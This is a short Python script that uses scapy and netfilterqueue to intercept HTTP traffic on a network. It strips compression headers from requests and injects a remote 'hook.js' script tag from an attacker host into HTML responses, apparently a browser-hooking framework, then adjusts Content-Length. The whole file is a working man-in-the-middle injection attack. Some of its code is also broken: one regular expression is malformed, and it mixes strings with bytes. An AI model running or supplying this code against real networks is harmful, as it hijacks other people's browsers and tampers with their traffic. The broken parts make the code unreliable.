#!/usr/bin/env python 


import scapy.all as scapy
import netfilterqueue
import re

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Recalculate checksums and lengths
    del packet[scapy.IP].len
    del packet[scapy.IP].checksum
    del packet[scapy.TCP].checksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:  # HTTP request
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
                
            elif scapy_packet[scapy.TCP].sport == 80:  # HTTP response
                print("[+] Response")         
                injection_payload = "<script src='http://X.X.X.X:3000/hook.js'></script>"
                load = load.replace("</body>", injection_payload +"</body>")
                content_length_search = re.search("?:(Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load :
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_payload)
                    load = load.replace(content_length, str(new_content_length))


            if load != scapy_packet[scapy.Raw].load :
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError :
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
